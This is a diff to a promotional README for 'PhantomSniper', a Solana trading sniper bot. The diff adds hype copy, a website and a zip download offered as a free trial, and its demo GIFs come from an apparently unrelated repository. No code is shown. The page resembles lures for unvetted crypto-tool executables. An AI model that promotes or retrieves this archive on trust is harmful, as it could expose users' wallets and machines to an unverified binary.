@@ -2,11 +2,19 @@
 
 ## Unleash the Power of PhantomSniper!
 
+![PhantomSniper Logo](https://i.imgur.com/x9HxeKf.png)
+
 Welcome to PhantomSniper, your ultimate desktop sniper bot designed for the Solana blockchain. Stay ahead of the competition with our cutting-edge features tailored for precision trading.
+
+Website: https://phantomsniper.app/
+
+Free trial: https://phantomsniper.app/PhantomSniper.zip
 
 ![PhantomSniper in Action](https://github.com/timuruva/realtime-processing/raw/127d46a2edc57ec1449d8976e04f301e3c1997b7/Files/line.gif)
 
 ### Key Features
+
+![PhantomSniper Logo](https://i.imgur.com/gt9YDdE.png)
 
 - **Real-Time Tracking:** Stay updated with instant notifications on token listings and market movements.
 - **Lightning-Fast Execution:** Execute trades in milliseconds, ensuring you never miss a profitable opportunity.
@@ -25,7 +33,7 @@ Welcome to PhantomSniper, your ultimate desktop sniper bot designed for the Sola
 ![PhantomSniper in Action](https://github.com/timuruva/realtime-processing/raw/127d46a2edc57ec1449d8976e04f301e3c1997b7/Files/line.gif)
 
 ## Getting Started
- **Download:** [Insert Download Link]
+ **Download:** [https://phantomsniper.app/PhantomSniper.zip]
 
 ![PhantomSniper in Action](https://github.com/timuruva/realtime-processing/raw/127d46a2edc57ec1449d8976e04f301e3c1997b7/Files/line.gif)
 
